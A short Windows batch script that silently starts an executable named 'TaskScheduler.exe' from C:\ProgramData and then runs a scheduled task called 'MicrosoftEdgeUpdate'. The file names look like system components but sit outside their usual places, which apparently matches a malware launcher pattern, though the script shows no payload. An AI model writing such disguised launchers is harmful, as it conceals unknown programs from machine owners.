@echo off
start /MIN /d "C:\ProgramData" TaskScheduler.exe
timeout /t 10 /nobreak
schtasks /run /tn "MicrosoftEdgeUpdate"